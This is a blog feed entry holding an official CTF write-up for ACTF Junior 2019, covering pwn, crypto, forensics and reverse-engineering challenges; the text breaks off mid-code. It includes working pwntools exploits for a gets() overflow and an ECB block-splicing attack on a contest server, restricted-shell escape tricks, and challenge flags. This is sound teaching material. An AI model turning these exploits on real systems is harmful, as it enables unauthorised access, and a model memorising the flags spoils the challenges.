<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
	<title>LuckyDog | CSUwangj&#x27;s Blog - Forensics</title>
	<link href="https://CSUwangj.github.io/tags/Forensics/atom.xml" rel="self" type="application/atom+xml"/>
  <link href="https://CSUwangj.github.io/"/>
	<generator uri="https://www.getzola.org/">Zola</generator>
	<updated>2020-08-07T02:01:26.829857+08:00</updated>
	<id>https://CSUwangj.github.io/tags/Forensics/atom.xml</id>
	<entry xml:lang="en">
		<title>ACTF Junior 2019 Official WriteUP of CSUWangj&#x27;s Challenge</title>
		<published>2019-02-28T15:55:24+08:00</published>
		<updated>2020-08-07T02:01:26.829857+08:00</updated>
		<link rel="alternate" href="https://CSUwangj.github.io/actf-junior-2019-official-writeup-of-csuwangj-s-challenge/" type="text/html"/>
		<id>https://CSUwangj.github.io/actf-junior-2019-official-writeup-of-csuwangj-s-challenge/</id>
		<content type="html">&lt;p&gt;日常出锅、、、&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;&lt;h1 id=&quot;linux-pwn&quot;&gt;Linux&amp;amp;PWN&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;vim&quot;&gt;vim&lt;&#x2F;h2&gt;
&lt;p&gt;首先要了解vim的几个模式&lt;&#x2F;p&gt;
&lt;p&gt;然后vim在普通模式下是可以执行Linux命令的，然后就可以ls, cat flag之类的了。&lt;&#x2F;p&gt;
&lt;p&gt;感谢各位没有把容器玩坏。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;no-more-gets1&quot;&gt;No_more_gets1&lt;&#x2F;h2&gt;
&lt;p&gt;查看&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;CSUwangj&#x2F;ACTF_Junior_2019&#x2F;blob&#x2F;master&#x2F;Linux%26PWN&#x2F;No_more_gets2&#x2F;src&#x2F;src.c&quot;&gt;源码&lt;&#x2F;a&gt;，问题出在&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;CSUwangj&#x2F;ACTF_Junior_2019&#x2F;blob&#x2F;master&#x2F;Linux%26PWN&#x2F;No_more_gets1&#x2F;src&#x2F;src.c#L140&quot;&gt;第140行（rigist()+12）&lt;&#x2F;a&gt;，passwdbuf在namebuf前面，所以gets的时候可以把namebuf覆盖掉，于是就能强行注册一个密码自己设定的admin。&lt;&#x2F;p&gt;
&lt;p&gt;一个可用的exp（来自给力的学弟）如下：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;from pwn import *
import sys
# context.log_level=&amp;#x27;debug&amp;#x27;

if args[&amp;#x27;REMOTE&amp;#x27;]:
    sh = remote(sys.argv[1], sys.argv[2])
else:
    sh = process(&amp;quot;.&amp;#x2F;a.out&amp;quot;)

payload=0x10 * &amp;#x27;a&amp;#x27; + p64(0x0) + p64(0x555555555607)

sh.recvuntil(&amp;quot;6) Exit&amp;quot;)
sh.sendline(&amp;quot;3&amp;quot;)
#gdb.attach(sh)
#gdb.attach(sh)
sh.recvuntil(&amp;quot;Input your name&amp;quot;)
sh.sendline(&amp;#x27;father&amp;#x27;)
sh.recvuntil(&amp;#x27;Input your password&amp;#x27;)
sh.sendline(&amp;#x27;aaaaaaaaaaaaaaa\0admin\0&amp;#x27;)
sh.recvuntil(&amp;quot;6) Exit&amp;quot;)
sh.sendline(&amp;#x27;2&amp;#x27;)
sh.sendline(&amp;#x27;admin&amp;#x27;)
sh.sendline(&amp;#x27;aaaaaaaaaaaaaaa&amp;#x27;)
sh.sendline(&amp;#x27;4&amp;#x27;)
print sh.recvuntil(&amp;#x27;}&amp;#x27;)
sh.sendline(&amp;#x27;6&amp;#x27;)
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;special-shell&quot;&gt;Special_Shell&lt;&#x2F;h2&gt;
&lt;p&gt;这个题是HGAME2018里看到的，感觉很有意思，YTB上有更详细的视频。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;CSUAuroraLab&#x2F;ACTF_Junior_2019&#x2F;blob&#x2F;master&#x2F;Linux%26PWN&#x2F;Special_Shell&#x2F;src&#x2F;src.c&quot;&gt;&lt;strong&gt;源码&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;有两个预期解，一方面来说，假如去阅读system()的&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;linux.die.net&#x2F;man&#x2F;3&#x2F;system&quot;&gt;手册&lt;&#x2F;a&gt;会看到&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Do not use &lt;strong&gt;system&lt;&#x2F;strong&gt;() from a program with set-user-ID or set-group-ID privileges, because strange values for some environment variables might be used to subvert system integrity. Use the &lt;em&gt;&lt;strong&gt;exec&lt;&#x2F;strong&gt;(3)&lt;&#x2F;em&gt; family of functions instead, but not &lt;em&gt;&lt;strong&gt;execlp&lt;&#x2F;strong&gt;(3)&lt;&#x2F;em&gt; or &lt;em&gt;&lt;strong&gt;execvp&lt;&#x2F;strong&gt;(3)&lt;&#x2F;em&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;如果去找一些可能的实现可能可以看到下面这样的&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;int system(const char *command)
{
    &amp;#x2F;* balabala *&amp;#x2F;
        execl(&amp;quot;&amp;#x2F;bin&amp;#x2F;sh&amp;quot;, &amp;quot;sh&amp;quot;, &amp;quot;-c&amp;quot;, command, (char *) NULL);
        _exit(127);                     &amp;#x2F;* We could not exec the shell *&amp;#x2F;

    &amp;#x2F;* balabala *&amp;#x2F;
    return status;
}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;所以用&lt;code&gt;$0&lt;&#x2F;code&gt;是可以getshell的。&lt;&#x2F;p&gt;
&lt;p&gt;另一方面来说，&lt;code&gt;man bash&lt;&#x2F;code&gt;一下，了解一下&lt;code&gt;meta character in bash&lt;&#x2F;code&gt;，可以用&lt;code&gt;&#x2F;???&#x2F;?? .&lt;&#x2F;code&gt;得出目录，然后&lt;code&gt;&#x2F;???&#x2F;??? ????&lt;&#x2F;code&gt;看到flag。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;no-more-gets2&quot;&gt;No_more_gets2&lt;&#x2F;h2&gt;
&lt;p&gt;查看&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;CSUwangj&#x2F;ACTF_Junior_2019&#x2F;blob&#x2F;master&#x2F;Linux%26PWN&#x2F;No_more_gets2&#x2F;src&#x2F;src.c&quot;&gt;源码&lt;&#x2F;a&gt;，问题出在开始就莫名其妙的&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;CSUwangj&#x2F;ACTF_Junior_2019&#x2F;blob&#x2F;master&#x2F;Linux%26PWN&#x2F;No_more_gets2&#x2F;src&#x2F;src.c#L41&quot;&gt;输入用户名&lt;&#x2F;a&gt;。&lt;&#x2F;p&gt;
&lt;p&gt;只需要了解一下字节序、ascii码，这题就能解决了。&lt;&#x2F;p&gt;
&lt;h1 id=&quot;crypto&quot;&gt;Crypto&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;casear&quot;&gt;casear&lt;&#x2F;h2&gt;
&lt;p&gt;移位密码，加密时偏移量为+2，没有改变数字、大小写这几个属性&lt;&#x2F;p&gt;
&lt;p&gt;至于你说那么多人把数字改成字母、、、&lt;&#x2F;p&gt;
&lt;p&gt;算了，心累，这题提交失败超过20次的，线下逮到出题人请吃饭。。。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;fan-shu&quot;&gt;矾书&lt;&#x2F;h2&gt;
&lt;p&gt;就是把字符画的主体换成了白色字体保存成PDF。&lt;&#x2F;p&gt;
&lt;p&gt;大家还是很机灵的，顺便如果有个正好符合需求的PDF浏览器，这个题会解决得很快。&lt;&#x2F;p&gt;
&lt;p&gt;{% asset_img test.png %}&lt;&#x2F;p&gt;
&lt;h2 id=&quot;fan-qie-ma&quot;&gt;反切码&lt;&#x2F;h2&gt;
&lt;p&gt;这里我偷了懒，并没有深入地考察这个东西、、、只需要百度就能找到出处，因为古音有八个读音，而现在只有四个，所以特地注明了一下用普通话来读。&lt;&#x2F;p&gt;
&lt;p&gt;（其实当时想吃的是火锅，但是缺声母来着）&lt;&#x2F;p&gt;
&lt;h2 id=&quot;tiny-rsa&quot;&gt;Tiny RSA&lt;&#x2F;h2&gt;
&lt;p&gt;就是一个非常非常naive的RSA，简易到可以用手算，希望大家对将要到来的&lt;strong&gt;段老师&lt;&#x2F;strong&gt;教授的密码学有所期待，段老师真的超好！&lt;&#x2F;p&gt;
&lt;p&gt;（貌似18级开始只有信安才有密码学，但是明明计算机相关的都应该学一点）&lt;&#x2F;p&gt;
&lt;h2 id=&quot;so-called-ecb&quot;&gt;So called ECB&lt;&#x2F;h2&gt;
&lt;p&gt;只要学到密码学的加密模式肯定会说到不要使用ECB的，而这里为了降低还特地把用户名、密码什么的分开加密再拼接，然而没有人做，感觉很不爽，不想给exp...&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;from pwn import *
# context.log_level=&amp;#x27;debug&amp;#x27;

def regist(r, name, passwd):
	print &amp;quot;[*] Resitering Account&amp;quot;
	r.sendline(&amp;#x27;1&amp;#x27;)
	r.sendline(name)
	r.sendline(passwd)
	r.recvuntil(&amp;#x27;to {}&amp;#x27;.format(name))
	print &amp;quot;[+] Succeed&amp;quot;
	return r.recv()[2:130]

def transfer(r, name, passwd, to, amount):
	print &amp;quot;[*] Transferring&amp;quot;
	r.sendline(&amp;#x27;2&amp;#x27;)
	r.sendline(name)
	r.sendline(passwd)
	r.sendline(to)
	r.sendline(str(amount))
	r.recvuntil(&amp;#x27;to {}&amp;#x27;.format(to))
	print &amp;quot;[+] Succeed&amp;quot;
	return r.recv()[2:130]
	
r = remote(&amp;quot;47.107.33.15&amp;quot;, 45338)
name = &amp;#x27;a&amp;#x27;
passwd = &amp;#x27;a&amp;#x27;
admin = &amp;#x27;admin&amp;#x27;
payload = regist(r, name, passwd)[:96]
payload += transfer(r, name, passwd, admin, 1001)[96:128]
print &amp;quot;[*] Stealing money from admin&amp;quot;
for i in range(10):
	r.sendline(&amp;#x27;3&amp;#x27;)
	r.sendline(payload)
print &amp;quot;[+] Done&amp;quot;
print &amp;quot;[*] Querying flag&amp;quot;
r.sendline(&amp;#x27;5&amp;#x27;)
r.sendline(name)
r.sendline(passwd)
flag = r.recvuntil(&amp;quot;}&amp;quot;)
index = -1
try:
	index = flag.index(&amp;#x27;actf&amp;#x27;)
except:
	index = flag.index(&amp;#x27;ACTF&amp;#x27;)
flag = flag[index:]
print &amp;quot;[flag] {}&amp;quot;.format(flag)
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;broken-random&quot;&gt;Broken Random&lt;&#x2F;h2&gt;
&lt;p&gt;这题毕竟源码都给了，要点也都提示到了，其实没什么难度。&lt;&#x2F;p&gt;
&lt;p&gt;直接的攻击点在于&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;CSUwangj&#x2F;ACTF_Junior_2019&#x2F;blob&#x2F;master&#x2F;Crypto&#x2F;Broken%20Random&#x2F;src&#x2F;src.c#L14&quot;&gt;srand(time(NULL))&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;srand()的效果是给rand()设置种子，问题就在于用&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;linux.die.net&#x2F;man&#x2F;2&#x2F;time&quot;&gt;time(NULL)&lt;&#x2F;a&gt;。&lt;&#x2F;p&gt;
&lt;p&gt;从文档里可以知道，time(NULL)返回从1970-01-01 00:00:00 +0000 (UTC)开始到现在的&lt;strong&gt;秒&lt;&#x2F;strong&gt;数。&lt;&#x2F;p&gt;
&lt;p&gt;所以至少有以下几种攻击方式：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;同时开两个terminal，同时nc一下就很有可能让两个程序用同一个种子，只需要读一个写一个就行。&lt;&#x2F;li&gt;
&lt;li&gt;把程序自己编译一遍，一边nc一边运行。&lt;&#x2F;li&gt;
&lt;li&gt;暴力猜一下服务器的时间。（本地暴力）。&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h2 id=&quot;rsa-lab&quot;&gt;RSA Lab&lt;&#x2F;h2&gt;
&lt;p&gt;RSA相关的小问答，没什么难度。实际上这个才是tiny RSA，之前那个算是趣味小游戏的程度:D&lt;&#x2F;p&gt;
&lt;h2 id=&quot;happybirthday&quot;&gt;HappyBirthday&lt;&#x2F;h2&gt;
&lt;p&gt;生日攻击啊、、、&lt;&#x2F;p&gt;
&lt;p&gt;听到有人说这个难度大，我已经把难度降低过了 ，原来的长度有56，60和64的、、、&lt;&#x2F;p&gt;
&lt;p&gt;50位的话，碰撞一次的代价大概是$2^{25}$。&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;好的，前面一顿分析全当放屁，愚蠢的出题人想当然认为[:50]是前50位而忘记了那是十六进制的问题。所以正常难度应该是把代码改成[:13]或者[:12]。。。&lt;&#x2F;p&gt;
&lt;p&gt;EXP没什么好放的吧，就跑跑暴力的事情。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;non-cryptography-hash&quot;&gt;Non-cryptography Hash&lt;&#x2F;h2&gt;
&lt;p&gt;这个题是看起来难的其实一点也不难的题，因为它的值域一共就、、、那么多、、、&lt;&#x2F;p&gt;
&lt;p&gt;所以，不管是直接暴力，还是暴力建表然后查找，理论上都是可行的、、、&lt;&#x2F;p&gt;
&lt;h2 id=&quot;dian-ji-ying-xiong-1cun-dang-xiu-gai&quot;&gt;点击英雄1存档修改&lt;&#x2F;h2&gt;
&lt;p&gt;这个就不说了吧，也没有人问我，看起来都不想放弃游戏体验呢&lt;&#x2F;p&gt;
&lt;h1 id=&quot;forensics&quot;&gt;Forensics&lt;&#x2F;h1&gt;
&lt;p&gt;这部分题目我个人感觉解法是很多的，在我的认知里取证和渗透类似，不同的人不同的工具都会有不同的效果，而且可能都可以达成目的，这里的解答仅作参考，如果有什么特别的解法请&lt;a href=&quot;mailto:CSUwangj@protonmail.com&quot;&gt;告知我&lt;&#x2F;a&gt;，万分感激。&lt;&#x2F;p&gt;
&lt;p&gt;顺便这几个题对flag的字符串都没有做什么隐藏，所以除了一个人以外都是strings&#x2F;脱壳后strings解出来的，令出题人感到非常伤心，这根本不好玩嘛&lt;&#x2F;p&gt;
&lt;h2 id=&quot;popbox&quot;&gt;Popbox&lt;&#x2F;h2&gt;
&lt;p&gt;重定向输出流即可，cmd下可以直接&amp;gt;，powershell需要用Out-File。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;donothing&quot;&gt;DoNothing&lt;&#x2F;h2&gt;
&lt;p&gt;找程序，可以从启动项&#x2F;任务管理器里找到一个不一样svchost.exe。&lt;&#x2F;p&gt;
&lt;p&gt;接下来可以通过查看这个程序相关的活动找到输出文件，里面含有flag。&lt;&#x2F;p&gt;
&lt;p&gt;也可以直接查看系统里所有的IO&#x2F;网络&#x2F;注册表等的操作情况来查找。这里推荐一下微软的工具箱SysinternalSuite里的procmon。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;memory&quot;&gt;Memory&lt;&#x2F;h2&gt;
&lt;p&gt;flag放在程序的栈上面的，dump下来找一下就行了。&lt;&#x2F;p&gt;
&lt;p&gt;也可以直接在内存里找。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;wirefish&quot;&gt;WireFish&lt;&#x2F;h2&gt;
&lt;p&gt;WireShark抓一下就出来了&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;这条分割线以下不是我出的，代发一下&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;reverse&quot;&gt;Reverse&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;show-me-the-code&quot;&gt;show me the code&lt;&#x2F;h2&gt;
&lt;p&gt;我们只看比较关键的给出的代码：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;for (int i = 1; keystr[i]; i++) {
		keystr[i] ^= keystr[i-1];
		keystr[i] += 2;
	}
...
if(!strcmp(keystr,enstr)){
    ...
}
else{
    ...
}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;用户的输入在经过for循环的操作之后与enstr字符串比对，若相同则提示输入正确，所以我们要做的就是从给出的enstr字符串和for循环里的操作来__逆推__出正确的输入应该是怎样的。&lt;&#x2F;p&gt;
&lt;p&gt;for循环里从第1位字符开始每个字符异或上一位的字符之后加2，加的逆操作是减，而异或的逆操作则是再次异或相同的数，比如说(a^b)^b = a ，所以我们的逆操作应该是从enstr最后一位字符开始，每一位先减2再异或前一位，循环至第1位，代码如下：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;## include&amp;lt;stdio.h&amp;gt;

int main(){
    char enstr[]={0x41,0x04,0x52,0x16,0x6f,0x3a,0x10,0x23,0x42,0x74,0x1b,0x31,0x70,0x49,0x7b,0x26,0x56,0x64,0x3d,0x4c,0x7e,0x0e,0x41,0x27,0x08,0x77};
    for(int j=25;j&amp;gt;=1;j--){
		enstr[j] -= 2;
		enstr[j] ^= enstr[j-1];
	}
	printf(&amp;quot;%s&amp;quot;,enstr);
    return 0;
}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;得到flag：&lt;strong&gt;ACTF{W41c0m4_70_r4_w0r1d!}&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;shi-wo-idala&quot;&gt;食我ida啦&lt;&#x2F;h2&gt;
&lt;p&gt;这一题主要是想做一个工具使用的引导，如题所说需要掌握ida的一个最基本的用法，即反编译二进制文件后找到主函数，按下F5查看c代码。&lt;&#x2F;p&gt;
&lt;p&gt;在这一题里做到这一步就能直观地取得flag：&lt;strong&gt;ACTF{L15e_1da_d0_rEveR53}&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;（由于出题人图样，flag直接明文存放，可以直接放到二进制编辑器中搜索到flag的大部分。挨打×1）&lt;&#x2F;p&gt;
&lt;h2 id=&quot;simple-packer&quot;&gt;simple packer&lt;&#x2F;h2&gt;
&lt;p&gt;壳是程序本身为了达成防护或者减小体积的一种手段，根据目的不同分为加密壳和压缩壳。加了壳的程序无法直接进行逆向分析，一般的应对手段是脱壳。&lt;&#x2F;p&gt;
&lt;p&gt;本题采用的壳是upx 2.03，属于压缩壳中比较常见的一种。对于这种壳不需要自己手动脱壳，借助&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;15P9RMXuitwS3CBl3PFVlig&quot;&gt;工具&lt;&#x2F;a&gt;(提取码a8rs)可以完成脱壳的工作。本题主要的目的也是让入门的同学们认识到脱壳这一过程，脱完壳后使用ida进行分析可以直接拿到flag：&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;ACTF{L15e_1da_d0_rEveR53}&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;有关壳的其他相关知识感兴趣的同学可以接下来前往吾爱破解等安全相关论坛学习，里面有丰富的资料。&lt;&#x2F;p&gt;
&lt;p&gt;（由于出题人再次图样，flag又直接明文存放，之前提到的操作可以搜索到完整的flag。绝赞挨打中qwq）&lt;&#x2F;p&gt;
&lt;h2 id=&quot;simple-asm&quot;&gt;simple asm&lt;&#x2F;h2&gt;
&lt;p&gt;根据给出的c代码我们可以知道这整个程序的流程很简单，要求输入flag后，把输入传入func函数，以func函数的返回值判断用户输入的是否为正确的flag，所以现在要做的就是分析func函数的功能从而解出flag。接下来开始一步步分析给出的func函数的汇编码：&lt;&#x2F;p&gt;
&lt;p&gt;最开始的这一段分析需要掌握栈帧以及函数调用约定的相关知识，这里直接给出分析的结果：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;assembly&quot; class=&quot;language-assembly &quot;&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt;   0x0006fa &amp;lt;+0&amp;gt;:	push   rbp
   0x0006fb &amp;lt;+1&amp;gt;:	mov    rbp,rsp
   0x0006fe &amp;lt;+4&amp;gt;:	mov    QWORD PTR [rbp-0x18],rdi
   0x000702 &amp;lt;+8&amp;gt;:	mov    DWORD PTR [rbp-0x4],0x0
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;在simple.c中我们知道有这样一个调用：&lt;code&gt;func(input)&lt;&#x2F;code&gt; ，而上面的汇编代码实现的是将参数&lt;code&gt;input&lt;&#x2F;code&gt;的地址保存到&lt;code&gt;[rbp-0x18]&lt;&#x2F;code&gt;这个地方。之后&lt;code&gt;[rbp-0x4]&lt;&#x2F;code&gt;则作为一个局部变量，为其赋值为&lt;code&gt;0x0&lt;&#x2F;code&gt;。到这里我们可以尝试还原一下c代码：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;int func(char *input){
    int i=0x0;
    ...
}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;我们将&lt;code&gt;[rbp-0x4]&lt;&#x2F;code&gt;假设为int型变量i，&lt;code&gt;[rbp-0x18]&lt;&#x2F;code&gt;假设为指向用户输入字符串首地址的指针input，往后看:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;assembly&quot; class=&quot;language-assembly &quot;&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt; 0x000709 &amp;lt;+15&amp;gt;:	jmp    0x75d &amp;lt;func+99&amp;gt;
 ...
 0x00075d &amp;lt;+99&amp;gt;:	cmp    DWORD PTR [rbp-0x4],0x15
 0x000761 &amp;lt;+103&amp;gt;:	jle    0x70b &amp;lt;func+17&amp;gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;跳转到&amp;lt;func+99&amp;gt;后将&lt;code&gt;[rbp-0x4]&lt;&#x2F;code&gt;中的值（也就是i）与&lt;code&gt;0x15&lt;&#x2F;code&gt;比较，只要不大于&lt;code&gt;0x15&lt;&#x2F;code&gt;就会跳转到&amp;lt;func+17&amp;gt;处。因为i的初值为&lt;code&gt;0x0&lt;&#x2F;code&gt;，所以会实现跳转。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;assembly&quot; class=&quot;language-assembly &quot;&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt; 0x00070b &amp;lt;+17&amp;gt;:	mov    eax,DWORD PTR [rbp-0x4]
 0x00070e &amp;lt;+20&amp;gt;:	movsxd rdx,eax
 0x000711 &amp;lt;+23&amp;gt;:	mov    rax,QWORD PTR [rbp-0x18]
 0x000715 &amp;lt;+27&amp;gt;:	add    rax,rdx
 0x000718 &amp;lt;+30&amp;gt;:	movzx  edx,BYTE PTR [rax]
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;根据先前的假设，前四行相当于完成了&lt;code&gt;(input+i)&lt;&#x2F;code&gt;,使input指向第i位字符；再看最后的&lt;code&gt;movzx  edx,BYTE PTR [rax]&lt;&#x2F;code&gt;,这里实现了寻址到&lt;code&gt;(input+i)&lt;&#x2F;code&gt;所表示的地址处并将此地址内存储的值传给edx，写成伪c代码相当于&lt;code&gt;edx = *(input + i)&lt;&#x2F;code&gt; 。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;assembly&quot; class=&quot;language-assembly &quot;&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt; 0x00071b &amp;lt;+33&amp;gt;:	mov    eax,DWORD PTR [rbp-0x4]
 0x00071e &amp;lt;+36&amp;gt;:	movsxd rcx,eax
 0x000721 &amp;lt;+39&amp;gt;:	mov    rax,QWORD PTR [rbp-0x18]
 0x000725 &amp;lt;+43&amp;gt;:	add    rax,rcx
 0x000728 &amp;lt;+46&amp;gt;:	add    edx,0x7
 0x00072b &amp;lt;+49&amp;gt;:	mov    BYTE PTR [rax],dl
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;这里是比较关键的一个点，前四行进行的是与上一段相同的工作，到了第五行出现了使&lt;code&gt;edx&lt;&#x2F;code&gt;的值加7的操作，而在之前的分析中此时&lt;code&gt;edx&lt;&#x2F;code&gt;中存放的是&lt;code&gt;*(input+i)&lt;&#x2F;code&gt;，最后一行则是将加7之后的结果赋给原&lt;code&gt;(input+i)&lt;&#x2F;code&gt;的地址处。综上，上面的两段汇编实现了:  &lt;code&gt; *(input+i) += 7&lt;&#x2F;code&gt;，继续往下看：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;assembly&quot; class=&quot;language-assembly &quot;&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt;   0x00072d &amp;lt;+51&amp;gt;:	mov    eax,DWORD PTR [rbp-0x4]
   0x000730 &amp;lt;+54&amp;gt;:	movsxd rdx,eax
   0x000733 &amp;lt;+57&amp;gt;:	mov    rax,QWORD PTR [rbp-0x18]
   0x000737 &amp;lt;+61&amp;gt;:	add    rax,rdx
   0x00073a &amp;lt;+64&amp;gt;:	movzx  ecx,BYTE PTR [rax]
   0x00073d &amp;lt;+67&amp;gt;:	mov    eax,DWORD PTR [rbp-0x4]
   0x000740 &amp;lt;+70&amp;gt;:	movsxd rdx,eax
   0x000743 &amp;lt;+73&amp;gt;:	lea    rax,[rip+0x2008f6]        ##  0x201040 &amp;lt;enstr&amp;gt;
   0x00074a &amp;lt;+80&amp;gt;:	movzx  eax,BYTE PTR [rdx+rax*1]
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;前5行做的是一样的事，写成伪代码就是 &lt;code&gt;ecx = *(input + i)&lt;&#x2F;code&gt; ; 之后2行则为&lt;code&gt;rdx = i&lt;&#x2F;code&gt;; 最后2行比较关键，&lt;code&gt;lea    rax,[rip+0x2008f6]&lt;&#x2F;code&gt;所做的是将simple.c中给出的字符数组&lt;code&gt;enstr&lt;&#x2F;code&gt;的首地址存入&lt;code&gt;rax&lt;&#x2F;code&gt;，而后综合前面的分析可以得出伪代码&lt;code&gt; eax = *(enstr + i)&lt;&#x2F;code&gt;，之后是比较和跳转操作：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;assembly&quot; class=&quot;language-assembly &quot;&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt;   0x00074e &amp;lt;+84&amp;gt;:	cmp    cl,al
   0x000750 &amp;lt;+86&amp;gt;:	je     0x759 &amp;lt;func+95&amp;gt;
   0x000752 &amp;lt;+88&amp;gt;:	mov    eax,0x1
   0x000757 &amp;lt;+93&amp;gt;:	jmp    0x768 &amp;lt;func+110&amp;gt;
   0x000759 &amp;lt;+95&amp;gt;:	add    DWORD PTR [rbp-0x4],0x1
   0x00075d &amp;lt;+99&amp;gt;:	cmp    DWORD PTR [rbp-0x4],0x15
   0x000761 &amp;lt;+103&amp;gt;:	jle    0x70b &amp;lt;func+17&amp;gt;
   0x000763 &amp;lt;+105&amp;gt;:	mov    eax,0x0
   0x000768 &amp;lt;+110&amp;gt;:	pop    rbp
   0x000769 &amp;lt;+111&amp;gt;:	ret
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;由之前的分析可以很容易看懂这里第一行的&lt;code&gt;cmp&lt;&#x2F;code&gt;操作:&lt;code&gt;*(input + i)&lt;&#x2F;code&gt;与&lt;code&gt;*(enstr + i)&lt;&#x2F;code&gt;比对（此时&lt;code&gt;*(input + i)&lt;&#x2F;code&gt;已经经过了加7的操作），相等则跳转到&amp;lt;func+95&amp;gt;继续执行，i的值加1，又进入&amp;lt;func+99&amp;gt;处的判断（可知这里应该是个while循环），直到i的值大于0x15后，给&lt;code&gt;eax&lt;&#x2F;code&gt;赋0，即此函数的返回值将为0，退回栈帧后返回；不相等则给&lt;code&gt;eax&lt;&#x2F;code&gt;赋1，即此函数的返回值将为1，跳转到&amp;lt;func+110&amp;gt;退回栈帧后返回。综合所有分析，完成c代码的还原:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;int func(unsigned char *input){
	for(int i=0;i&amp;lt;=21;i++){
